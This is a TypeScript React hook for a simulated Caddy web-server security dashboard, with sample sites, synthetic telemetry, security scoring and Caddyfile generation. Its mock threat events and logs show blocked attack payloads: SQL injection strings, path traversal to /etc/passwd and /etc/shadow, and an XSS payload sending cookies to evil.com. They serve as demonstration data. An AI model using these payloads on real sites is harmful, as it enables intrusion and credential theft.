/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, useCallback } from 'react';
import {
  SiteConfig,
  CyberThreatEvent,
  ServerLog,
  ServerMetricPoint,
  CaddyAdminConfig,
  SecurityScore,
  ResourceAlertThresholds
} from '../types';

const INITIAL_SITES: SiteConfig[] = [
  {
    id: 'site-1',
    domain: 'api.production.app',
    aliases: ['api-v2.production.app'],
    upstreams: [
      { id: 'u-1', address: '10.0.1.12:8000', status: 'healthy', latencyMs: 14, failsCount: 0, weight: 1 },
      { id: 'u-2', address: '10.0.1.13:8000', status: 'healthy', latencyMs: 18, failsCount: 0, weight: 1 },
      { id: 'u-3', address: '10.0.1.14:8000', status: 'healthy', latencyMs: 16, failsCount: 0, weight: 1 }
    ],
    loadBalancing: 'least_conn',
    tlsEnabled: true,
    tlsProvider: "Let's Encrypt",
    tlsCertExpiryDays: 74,
    tlsStatus: 'active',
    http3Enabled: true,
    gzipCompression: true,
    routes: [
      { id: 'r-1', path: '/v1/users/*', handler: 'reverse_proxy', target: 'user-service:5001', active: true },
      { id: 'r-2', path: '/v1/billing/*', handler: 'reverse_proxy', target: 'billing-service:5002', active: true },
      { id: 'r-3', path: '/v1/ws/*', handler: 'reverse_proxy', target: 'ws-gateway:8080', active: true },
      { id: 'r-4', path: '/healthz', handler: 'respond', target: '{"status":"ok"} 200', active: true }
    ],
    security: {
      wafEnabled: true,
      rateLimitRps: 120,
      burstLimit: 30,
      blockBadBots: true,
      hstsEnabled: true,
      hstsSubdomains: true,
      corsEnabled: true,
      allowedOrigins: ['https://production.app', 'https://admin.production.app'],
      ipWhitelist: ['192.168.1.0/24'],
      ipBlacklist: ['45.142.212.8', '185.220.101.5']
    },
    active: true,
    createdAt: '2026-08-10'
  },
  {
    id: 'site-2',
    domain: 'portal.cloudmesh.io',
    aliases: ['www.cloudmesh.io'],
    upstreams: [
      { id: 'u-4', address: '127.0.0.1:3000', status: 'healthy', latencyMs: 8, failsCount: 0 }
    ],
    loadBalancing: 'round_robin',
    tlsEnabled: true,
    tlsProvider: 'ZeroSSL',
    tlsCertExpiryDays: 45,
    tlsStatus: 'active',
    http3Enabled: true,
    gzipCompression: true,
    routes: [
      { id: 'r-5', path: '/static/*', handler: 'file_server', target: '/var/www/portal/dist', active: true },
      { id: 'r-6', path: '/*', handler: 'reverse_proxy', target: '127.0.0.1:3000', active: true }
    ],
    security: {
      wafEnabled: true,
      rateLimitRps: 80,
      burstLimit: 20,
      blockBadBots: true,
      hstsEnabled: true,
      hstsSubdomains: true,
      corsEnabled: false,
      allowedOrigins: [],
      ipWhitelist: [],
      ipBlacklist: ['91.240.118.150']
    },
    active: true,
    createdAt: '2026-08-22'
  },
  {
    id: 'site-3',
    domain: 'auth.vault.internal',
    upstreams: [
      { id: 'u-5', address: '10.0.2.5:8200', status: 'healthy', latencyMs: 5, failsCount: 0 }
    ],
    loadBalancing: 'first',
    tlsEnabled: true,
    tlsProvider: 'Internal CA',
    tlsCertExpiryDays: 360,
    tlsStatus: 'internal',
    http3Enabled: false,
    gzipCompression: true,
    routes: [
      { id: 'r-7', path: '/*', handler: 'reverse_proxy', target: '10.0.2.5:8200', active: true }
    ],
    security: {
      wafEnabled: true,
      rateLimitRps: 20,
      burstLimit: 5,
      blockBadBots: true,
      hstsEnabled: true,
      hstsSubdomains: false,
      corsEnabled: false,
      allowedOrigins: [],
      ipWhitelist: ['10.0.0.0/16', '127.0.0.1'],
      ipBlacklist: []
    },
    active: true,
    createdAt: '2026-09-01'
  }
];

const GEO_COORDS: Record<string, { lat: number; lng: number }> = {
  RU: { lat: 55.75, lng: 37.61 },
  NL: { lat: 52.36, lng: 4.90 },
  DE: { lat: 52.52, lng: 13.40 },
  BG: { lat: 42.69, lng: 23.32 },
  VN: { lat: 21.02, lng: 105.83 },
  CN: { lat: 39.90, lng: 116.40 },
  BR: { lat: -14.23, lng: -51.92 },
  US: { lat: 37.77, lng: -122.41 },
  IR: { lat: 35.68, lng: 51.38 },
  FR: { lat: 48.85, lng: 2.35 },
  GB: { lat: 51.50, lng: -0.12 },
  IN: { lat: 28.61, lng: 77.20 },
  SG: { lat: 1.35, lng: 103.81 },
  JP: { lat: 35.67, lng: 139.65 }
};

const SAMPLE_THREATS: CyberThreatEvent[] = [
  {
    id: 'threat-1',
    timestamp: '12 seconds ago',
    type: 'sqli',
    sourceIp: '194.26.29.112',
    country: 'Russia',
    countryCode: 'RU',
    lat: 55.75,
    lng: 37.61,
    targetDomain: 'api.production.app',
    targetPath: '/v1/users?id=1%27%20OR%201=1--',
    action: 'blocked',
    severity: 'critical',
    ruleTriggered: 'OWASP-CRS-942100: SQL Injection Vector Detected in Query String',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) python-requests/2.31'
  },
  {
    id: 'threat-2',
    timestamp: '48 seconds ago',
    type: 'bad_bot',
    sourceIp: '85.208.139.18',
    country: 'Netherlands',
    countryCode: 'NL',
    lat: 52.36,
    lng: 4.90,
    targetDomain: 'portal.cloudmesh.io',
    targetPath: '/wp-login.php',
    action: 'blocked',
    severity: 'medium',
    ruleTriggered: 'CaddyBotShield: Vulnerability Scanner CMS Probing',
    userAgent: 'SemrushBot/7~bl (http://www.semrush.com/bot.html)'
  },
  {
    id: 'threat-3',
    timestamp: '2 mins ago',
    type: 'ddos',
    sourceIp: '185.220.101.5',
    country: 'Germany',
    countryCode: 'DE',
    lat: 52.52,
    lng: 13.40,
    targetDomain: 'api.production.app',
    targetPath: '/v1/auth/login',
    action: 'rate_limited',
    severity: 'high',
    ruleTriggered: 'CaddyRateLimit: Exceeded 120 req/sec sliding window threshold',
    userAgent: 'Go-http-client/1.1'
  },
  {
    id: 'threat-4',
    timestamp: '4 mins ago',
    type: 'path_traversal',
    sourceIp: '45.142.212.8',
    country: 'Bulgaria',
    countryCode: 'BG',
    lat: 42.69,
    lng: 23.32,
    targetDomain: 'portal.cloudmesh.io',
    targetPath: '/../../etc/passwd',
    action: 'blocked',
    severity: 'critical',
    ruleTriggered: 'OWASP-CRS-930100: Path Traversal Attempt Blocked',
    userAgent: 'curl/7.88.1'
  },
  {
    id: 'threat-5',
    timestamp: '7 mins ago',
    type: 'xss',
    sourceIp: '103.151.125.4',
    country: 'Vietnam',
    countryCode: 'VN',
    lat: 21.02,
    lng: 105.83,
    targetDomain: 'portal.cloudmesh.io',
    targetPath: '/search?q=<script>document.location="http://evil.com/leak?"+document.cookie</script>',
    action: 'blocked',
    severity: 'high',
    ruleTriggered: 'OWASP-CRS-941100: XSS Injection Attempt Intercepted',
    userAgent: 'Mozilla/5.0 (X11; Linux x86_64)'
  }
];

const INITIAL_LOGS: ServerLog[] = [
  {
    id: 'log-1',
    timestamp: '2026-09-07T07:15:52Z',
    level: 'info',
    method: 'GET',
    host: 'api.production.app',
    uri: '/v1/users/profile',
    status: 200,
    clientIp: '172.56.21.84',
    durationMs: 14.2,
    upstream: '10.0.1.12:8000',
    userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile'
  },
  {
    id: 'log-2',
    timestamp: '2026-09-07T07:15:48Z',
    level: 'security',
    method: 'GET',
    host: 'api.production.app',
    uri: '/v1/users?id=1%27%20OR%201=1--',
    status: 403,
    clientIp: '194.26.29.112',
    durationMs: 1.1,
    userAgent: 'python-requests/2.31',
    threatDetails: 'SQLi Attempt: Blocked by Coraza WAF'
  },
  {
    id: 'log-3',
    timestamp: '2026-09-07T07:15:45Z',
    level: 'info',
    method: 'POST',
    host: 'api.production.app',
    uri: '/v1/billing/checkout',
    status: 201,
    clientIp: '73.189.44.12',
    durationMs: 86.4,
    upstream: 'billing-service:5002',
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
  },
  {
    id: 'log-4',
    timestamp: '2026-09-07T07:15:40Z',
    level: 'warn',
    method: 'POST',
    host: 'api.production.app',
    uri: '/v1/auth/login',
    status: 429,
    clientIp: '185.220.101.5',
    durationMs: 0.8,
    userAgent: 'Go-http-client/1.1',
    threatDetails: 'Rate Limit Exceeded (Retry-After: 60s)'
  },
  {
    id: 'log-5',
    timestamp: '2026-09-07T07:15:35Z',
    level: 'info',
    method: 'GET',
    host: 'portal.cloudmesh.io',
    uri: '/static/bundle.js',
    status: 200,
    clientIp: '98.248.102.19',
    durationMs: 3.4,
    upstream: 'file_server(/var/www)',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
  }
];

export function useCaddyState() {
  const [sites, setSites] = useState<SiteConfig[]>(() => {
    const saved = localStorage.getItem('caddydash_sites');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        console.error('Failed to parse saved sites', e);
      }
    }
    return INITIAL_SITES;
  });

  const [adminConfig, setAdminConfig] = useState<CaddyAdminConfig>({
    connected: true,
    adminUrl: 'http://localhost:2019',
    mode: 'demo_simulation',
    version: 'Caddy v2.9.1 (enterprise-built with coraza-waf, rate-limit, cloudflare-dns)',
    uptimeSeconds: 849200,
    memoryAllocatedMb: 38.4,
    goroutines: 142,
    configHash: 'sha256:7f9a2b91c0e3d48fa88b901a118833440',
    lastReloadTime: '24 mins ago'
  });

  const [threatEvents, setThreatEvents] = useState<CyberThreatEvent[]>(() => {
    const saved = localStorage.getItem('caddydash_threats');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        console.error('Failed to parse saved threats', e);
      }
    }
    return SAMPLE_THREATS;
  });

  const [logs, setLogs] = useState<ServerLog[]>(INITIAL_LOGS);
  const [isLiveStreaming, setIsLiveStreaming] = useState(true);

  // Resource Alert Thresholds & State
  const [alertThresholds, setAlertThresholds] = useState<ResourceAlertThresholds>(() => {
    try {
      const saved = localStorage.getItem('caddydash_alert_thresholds');
      if (saved) return JSON.parse(saved);
    } catch {}
    return {
      cpuPercent: 75,
      memoryMb: 45,
      enabled: true
    };
  });

  const [resourceAlert, setResourceAlert] = useState<{
    id: string;
    type: 'cpu' | 'memory';
    title: string;
    message: string;
    value: number;
    threshold: number;
    timestamp: string;
  } | null>(null);

  const [currentCpu, setCurrentCpu] = useState<number>(34);

  // Time-series telemetry points
  const [metricsHistory, setMetricsHistory] = useState<ServerMetricPoint[]>(() => {
    const points: ServerMetricPoint[] = [];
    const now = Date.now();
    for (let i = 19; i >= 0; i--) {
      const timeStr = new Date(now - i * 3000).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
      const baseReq = 180 + Math.sin(i * 0.5) * 45 + (Math.random() * 20);
      const simulatedCpu = Math.round(24 + (baseReq / 300) * 42);
      points.push({
        time: timeStr,
        reqsPerSec: Math.round(baseReq),
        activeConnections: Math.round(45 + Math.random() * 25),
        latencyMs: Math.round((14 + Math.random() * 12) * 10) / 10,
        bandwidthInMb: Math.round((2.4 + Math.random() * 1.5) * 100) / 100,
        bandwidthOutMb: Math.round((18.6 + Math.random() * 8.2) * 100) / 100,
        status2xx: Math.round(baseReq * 0.94),
        status4xx: Math.round(baseReq * 0.05),
        status5xx: Math.round(baseReq * 0.01),
        cpuPercent: simulatedCpu,
        memoryAllocatedMb: 38.4
      });
    }
    return points;
  });

  // Persist sites
  useEffect(() => {
    localStorage.setItem('caddydash_sites', JSON.stringify(sites));
  }, [sites]);

  // Live telemetry pulse simulation
  useEffect(() => {
    if (!isLiveStreaming) return;

    const interval = setInterval(() => {
      const now = new Date();
      const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
      
      const newReq = Math.round(170 + Math.random() * 70);
      const newLatency = Math.round((12 + Math.random() * 16) * 10) / 10;
      const newConns = Math.round(40 + Math.random() * 35);
      const newBwIn = Math.round((2.1 + Math.random() * 1.8) * 100) / 100;
      const newBwOut = Math.round((16.5 + Math.random() * 9.5) * 100) / 100;
      const s2 = Math.round(newReq * 0.95);
      const s4 = Math.round(newReq * 0.04);
      const s5 = Math.max(0, newReq - s2 - s4);

      const simulatedCpu = Math.min(96, Math.max(16, Math.round(20 + (newReq / 250) * 44 + Math.sin(Date.now() / 8000) * 10)));
      const newMemMb = Math.round((38.4 + Math.sin(Date.now() / 10000) * 2.2 + (newConns / 120) * 3.5) * 10) / 10;
      setCurrentCpu(simulatedCpu);

      setMetricsHistory(prev => {
        const next = [...prev.slice(1), {
          time: timeStr,
          reqsPerSec: newReq,
          activeConnections: newConns,
          latencyMs: newLatency,
          bandwidthInMb: newBwIn,
          bandwidthOutMb: newBwOut,
          status2xx: s2,
          status4xx: s4,
          status5xx: s5,
          cpuPercent: simulatedCpu,
          memoryAllocatedMb: newMemMb
        }];
        return next;
      });

      // Increment uptime
      setAdminConfig(prev => ({
        ...prev,
        uptimeSeconds: prev.uptimeSeconds + 2,
        memoryAllocatedMb: newMemMb
      }));

      // Automated Alert Notification System: monitor CPU and Memory thresholds
      if (alertThresholds.enabled) {
        if (simulatedCpu >= alertThresholds.cpuPercent) {
          setResourceAlert({
            id: 'alert-cpu-' + Date.now(),
            type: 'cpu',
            title: 'CRITICAL CPU LOAD EXCEEDED',
            message: `Server CPU usage surge at ${simulatedCpu}% (Exceeded configured threshold: ${alertThresholds.cpuPercent}%)`,
            value: simulatedCpu,
            threshold: alertThresholds.cpuPercent,
            timestamp: timeStr
          });
        } else if (newMemMb >= alertThresholds.memoryMb) {
          setResourceAlert({
            id: 'alert-mem-' + Date.now(),
            type: 'memory',
            title: 'HIGH MEMORY FOOTPRINT WARNING',
            message: `Caddy memory footprint reached ${newMemMb} MB (Exceeded configured threshold: ${alertThresholds.memoryMb} MB)`,
            value: newMemMb,
            threshold: alertThresholds.memoryMb,
            timestamp: timeStr
          });
        }
      }

      // Occasionally generate a real-time log
      if (Math.random() > 0.4) {
        const methods: ('GET' | 'POST' | 'PUT' | 'DELETE')[] = ['GET', 'GET', 'GET', 'POST', 'PUT'];
        const method = methods[Math.floor(Math.random() * methods.length)];
        const site = sites[Math.floor(Math.random() * sites.length)];
        const paths = ['/v1/feed', '/static/app.css', '/v1/users/me', '/v1/metrics', '/healthz', '/v1/products'];
        const uri = paths[Math.floor(Math.random() * paths.length)];
        const statuses = [200, 200, 200, 200, 304, 201, 404];
        const status = statuses[Math.floor(Math.random() * statuses.length)];

        const newLog: ServerLog = {
          id: 'log-' + Date.now(),
          timestamp: now.toISOString(),
          level: status >= 500 ? 'error' : status >= 400 ? 'warn' : 'info',
          method,
          host: site.domain,
          uri,
          status,
          clientIp: `${Math.floor(Math.random() * 150 + 20)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
          durationMs: Math.round((Math.random() * 35 + 3) * 10) / 10,
          upstream: site.upstreams[0]?.address || '127.0.0.1:8080'
        };

        setLogs(prev => [newLog, ...prev.slice(0, 70)]);
      }

      // Rarely simulate an intercepted cyber threat (every ~20 seconds)
      if (Math.random() > 0.88) {
        const attackTypes: ('sqli' | 'xss' | 'ddos' | 'bad_bot' | 'path_traversal' | 'scanner')[] = [
          'sqli', 'xss', 'bad_bot', 'path_traversal', 'scanner'
        ];
        const attack = attackTypes[Math.floor(Math.random() * attackTypes.length)];
        const countries = [
          { name: 'China', code: 'CN' },
          { name: 'Russia', code: 'RU' },
          { name: 'Brazil', code: 'BR' },
          { name: 'United States', code: 'US' },
          { name: 'Iran', code: 'IR' },
          { name: 'France', code: 'FR' }
        ];
        const geo = countries[Math.floor(Math.random() * countries.length)];
        const attackIps = `${Math.floor(Math.random() * 180 + 20)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`;

        let path = '/api/v1/auth';
        let rule = 'OWASP CRS Rule Triggered';
        let sev: 'critical' | 'high' | 'medium' = 'high';

        if (attack === 'sqli') {
          path = '/v1/items?search=\' UNION SELECT password FROM users--';
          rule = 'OWASP-CRS-942100: SQL Injection Attempt Dropped';
          sev = 'critical';
        } else if (attack === 'xss') {
          path = '/comments?text=<svg onload=alert(1)>';
          rule = 'OWASP-CRS-941100: Reflected XSS Signature Blocked';
          sev = 'high';
        } else if (attack === 'path_traversal') {
          path = '/download?file=../../../../etc/shadow';
          rule = 'OWASP-CRS-930100: File System Escape Blocked';
          sev = 'critical';
        } else if (attack === 'bad_bot') {
          path = '/robots.txt';
          rule = 'CaddyBotShield: Aggressive AI Scraper Dropped';
          sev = 'medium';
        } else {
          path = '/.env';
          rule = 'CaddyShield: Sensitive Environment File Probing Blocked';
          sev = 'high';
        }

        const coords = GEO_COORDS[geo.code] || { lat: 30, lng: 0 };

        const newThreat: CyberThreatEvent = {
          id: 'threat-' + Date.now(),
          timestamp: 'Just now',
          type: attack,
          sourceIp: attackIps,
          country: geo.name,
          countryCode: geo.code,
          lat: coords.lat + (Math.random() - 0.5) * 4,
          lng: coords.lng + (Math.random() - 0.5) * 4,
          targetDomain: sites[0]?.domain || 'api.production.app',
          targetPath: path,
          action: 'blocked',
          severity: sev,
          ruleTriggered: rule,
          userAgent: 'Automated Exploit Scanner v3.1'
        };

        setThreatEvents(prev => [newThreat, ...prev.slice(0, 30)]);

        // Log the threat as security log
        const threatLog: ServerLog = {
          id: 'log-sec-' + Date.now(),
          timestamp: now.toISOString(),
          level: 'security',
          method: 'GET',
          host: sites[0]?.domain || 'api.production.app',
          uri: path,
          status: 403,
          clientIp: attackIps,
          durationMs: 0.9,
          userAgent: 'ExploitScanner',
          threatDetails: rule
        };
        setLogs(prev => [threatLog, ...prev.slice(0, 70)]);
      }

    }, 2500);

    return () => clearInterval(interval);
  }, [isLiveStreaming, sites]);

  // Calculate Overall Security Score
  const calculateSecurityScore = useCallback((): SecurityScore => {
    let total = 0;
    const checks: SecurityScore['checks'] = [];

    // Check 1: All sites have TLS enabled
    const allTls = sites.every(s => s.tlsEnabled);
    total += allTls ? 25 : 5;
    checks.push({
      name: 'TLS/HTTPS Encryption',
      passed: allTls,
      category: 'TLS',
      description: allTls ? 'All configured domains have active TLS certificates with auto-renewal' : 'Some sites are listening on unencrypted HTTP',
      impact: '+25 pts'
    });

    // Check 2: WAF Coraza enabled
    const wafCount = sites.filter(s => s.security.wafEnabled).length;
    const wafScore = Math.round((wafCount / Math.max(1, sites.length)) * 25);
    total += wafScore;
    checks.push({
      name: 'Coraza Web Application Firewall',
      passed: wafCount === sites.length,
      category: 'WAF',
      description: `${wafCount}/${sites.length} domains protected with OWASP Top 10 rule inspection`,
      impact: `+${wafScore}/25 pts`
    });

    // Check 3: Rate Limiting & DDoS Protection
    const rateLimitCount = sites.filter(s => s.security.rateLimitRps > 0).length;
    const rlScore = Math.round((rateLimitCount / Math.max(1, sites.length)) * 25);
    total += rlScore;
    checks.push({
      name: 'DDoS & Rate Limiting Shaper',
      passed: rateLimitCount === sites.length,
      category: 'Access',
      description: `${rateLimitCount}/${sites.length} sites enforce sliding-window burst mitigation`,
      impact: `+${rlScore}/25 pts`
    });

    // Check 4: HSTS & Hardened Security Headers
    const hstsCount = sites.filter(s => s.security.hstsEnabled).length;
    const headersScore = Math.round((hstsCount / Math.max(1, sites.length)) * 25);
    total += headersScore;
    checks.push({
      name: 'Strict-Transport-Security (HSTS)',
      passed: hstsCount === sites.length,
      category: 'Headers',
      description: `${hstsCount}/${sites.length} sites inject preload-ready HSTS and anti-sniff headers`,
      impact: `+${headersScore}/25 pts`
    });

    let grade: SecurityScore['grade'] = 'F';
    if (total >= 95) grade = 'A+';
    else if (total >= 85) grade = 'A';
    else if (total >= 70) grade = 'B';
    else if (total >= 50) grade = 'C';
    else if (total >= 30) grade = 'D';

    return {
      total,
      grade,
      tlsScore: allTls ? 25 : 5,
      wafScore,
      headersScore,
      rateLimitScore: rlScore,
      checks
    };
  }, [sites]);

  // Generate valid Caddyfile from current state
  const generateCaddyfile = useCallback((): string => {
    let output = `# ====================================================================\n`;
    output += `# Caddyfile Generated by CaddyDash Pro\n`;
    output += `# Timestamp: ${new Date().toISOString()}\n`;
    output += `# ====================================================================\n\n`;

    output += `{\n`;
    output += `    admin localhost:2019\n`;
    output += `    log {\n`;
    output += `        output stdout\n`;
    output += `        format json\n`;
    output += `    }\n`;
    output += `}\n\n`;

    sites.forEach(site => {
      const domains = [site.domain, ...(site.aliases || [])].join(', ');
      output += `${domains} {\n`;

      if (site.gzipCompression) {
        output += `    encode zstd gzip\n`;
      }

      if (site.tlsEnabled) {
        if (site.tlsProvider === 'Internal CA') {
          output += `    tls internal\n`;
        } else if (site.tlsProvider === 'ZeroSSL') {
          output += `    tls {\n        issuer zerossl\n    }\n`;
        } else if (site.tlsProvider === 'Cloudflare DNS') {
          output += `    tls {\n        dns cloudflare {env.CF_API_TOKEN}\n    }\n`;
        }
      }

      // Security Headers
      output += `    header {\n`;
      if (site.security.hstsEnabled) {
        output += `        Strict-Transport-Security "max-age=63072000${site.security.hstsSubdomains ? '; includeSubDomains; preload' : ''}"\n`;
      }
      output += `        X-Content-Type-Options "nosniff"\n`;
      output += `        X-Frame-Options "DENY"\n`;
      output += `        Referrer-Policy "strict-origin-when-cross-origin"\n`;
      output += `        -Server\n`;
      output += `    }\n`;

      // WAF Coraza
      if (site.security.wafEnabled) {
        output += `    coraza_waf {\n`;
        output += `        directives_file /etc/caddy/coraza.conf\n`;
        output += `    }\n`;
      }

      // Bot protection
      if (site.security.blockBadBots) {
        output += `    @bad_bots header_regexp User-Agent "(?i)(SemrushBot|AhrefsBot|MJ12bot|DotBot|bytespider|GPTBot)"\n`;
        output += `    handle @bad_bots {\n`;
        output += `        respond "Access Blocked by CaddyDash BotShield" 403 { close }\n`;
        output += `    }\n`;
      }

      // Rate limit
      if (site.security.rateLimitRps > 0) {
        output += `    rate_limit {\n`;
        output += `        zone ${site.domain.replace(/[^a-zA-Z0-9]/g, '_')}_zone {\n`;
        output += `            key {remote_host}\n`;
        output += `            events ${site.security.rateLimitRps * 60}\n`;
        output += `            window 1m\n`;
        output += `        }\n`;
        output += `    }\n`;
      }

      // Custom routes
      site.routes.forEach(route => {
        if (!route.active) return;
        if (route.handler === 'reverse_proxy') {
          output += `    reverse_proxy ${route.path} ${route.target} {\n`;
          output += `        lb_policy ${site.loadBalancing}\n`;
          output += `        header_up Host {upstream_hostport}\n`;
          output += `        header_up X-Real-IP {remote_host}\n`;
          output += `        header_up X-Forwarded-Proto https\n`;
          output += `    }\n`;
        } else if (route.handler === 'file_server') {
          output += `    handle_path ${route.path} {\n`;
          output += `        root * ${route.target}\n`;
          output += `        file_server\n`;
          output += `    }\n`;
        } else if (route.handler === 'respond') {
          output += `    respond ${route.path} ${route.target}\n`;
        } else if (route.handler === 'redir') {
          output += `    redir ${route.path} ${route.target} permanent\n`;
        }
      });

      // Default fallback upstream if routes don't catch everything
      if (site.upstreams.length > 0) {
        const upTargets = site.upstreams.map(u => u.address).join(' ');
        output += `    reverse_proxy ${upTargets} {\n`;
        output += `        lb_policy ${site.loadBalancing}\n`;
        output += `    }\n`;
      }

      output += `}\n\n`;
    });

    return output;
  }, [sites]);

  // Actions
  const addSite = useCallback((newSite: SiteConfig) => {
    setSites(prev => [...prev, newSite]);
  }, []);

  const updateSite = useCallback((id: string, updated: Partial<SiteConfig>) => {
    setSites(prev => prev.map(s => s.id === id ? { ...s, ...updated } : s));
  }, []);

  const deleteSite = useCallback((id: string) => {
    setSites(prev => prev.filter(s => s.id !== id));
  }, []);

  const reloadCaddy = useCallback(async (): Promise<{ success: boolean; message: string }> => {
    // Zero-downtime simulated reload
    await new Promise(r => setTimeout(r, 650));
    setAdminConfig(prev => ({
      ...prev,
      lastReloadTime: 'Just now',
      configHash: 'sha256:' + Math.random().toString(16).substring(2, 10) + '...'
    }));
    return {
      success: true,
      message: 'Caddy zero-downtime configuration reload successful! In-flight connections preserved.'
    };
  }, []);

  const clearLogs = useCallback(() => {
    setLogs([]);
  }, []);

  const blockIpGlobal = useCallback((ip: string) => {
    setSites(prev => prev.map(s => ({
      ...s,
      security: {
        ...s.security,
        ipBlacklist: Array.from(new Set([...s.security.ipBlacklist, ip]))
      }
    })));
  }, []);

  const updateAlertThresholds = useCallback((newThresholds: ResourceAlertThresholds) => {
    setAlertThresholds(newThresholds);
    localStorage.setItem('caddydash_alert_thresholds', JSON.stringify(newThresholds));
  }, []);

  const dismissResourceAlert = useCallback(() => {
    setResourceAlert(null);
  }, []);

  const triggerTestResourceAlert = useCallback((type: 'cpu' | 'memory' = 'cpu') => {
    const timeStr = new Date().toLocaleTimeString();
    if (type === 'cpu') {
      setResourceAlert({
        id: 'test-alert-' + Date.now(),
        type: 'cpu',
        title: 'HIGH-PRIORITY CPU LOAD WARNING',
        message: `Simulated server CPU surge at 88.4% (Exceeded defined threshold: ${alertThresholds.cpuPercent}%)`,
        value: 88.4,
        threshold: alertThresholds.cpuPercent,
        timestamp: timeStr
      });
    } else {
      setResourceAlert({
        id: 'test-alert-' + Date.now(),
        type: 'memory',
        title: 'HIGH-PRIORITY MEMORY USAGE WARNING',
        message: `Simulated memory consumption at 52.8 MB (Exceeded defined threshold: ${alertThresholds.memoryMb} MB)`,
        value: 52.8,
        threshold: alertThresholds.memoryMb,
        timestamp: timeStr
      });
    }
  }, [alertThresholds]);

  return {
    sites,
    adminConfig,
    threatEvents,
    logs,
    metricsHistory,
    isLiveStreaming,
    setIsLiveStreaming,
    calculateSecurityScore,
    generateCaddyfile,
    addSite,
    updateSite,
    deleteSite,
    reloadCaddy,
    clearLogs,
    blockIpGlobal,
    setAdminConfig,
    alertThresholds,
    updateAlertThresholds,
    resourceAlert,
    dismissResourceAlert,
    triggerTestResourceAlert,
    currentCpu
  };
}
